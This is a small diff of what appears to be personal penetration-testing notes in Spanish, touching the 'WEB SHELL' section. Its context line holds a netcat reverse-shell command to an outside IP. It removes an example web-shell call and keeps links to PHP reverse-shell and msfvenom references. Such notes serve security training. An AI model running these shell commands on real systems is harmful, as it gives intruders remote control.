@@ -101,14 +101,12 @@ nc -e /bin/sh 8.8.8.8 8080
 
 
 WEB SHELL
-.........
-Para llamar a la webshell --> http://[IP]/webshell.php?cmd=ls
+..........
 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 https://book.hacktricks.xyz/shells/shells/msfvenom
 https://github.com/frizb/MSF-Venom-Cheatsheet
     
-
 
 COMMON PORTS
 ............
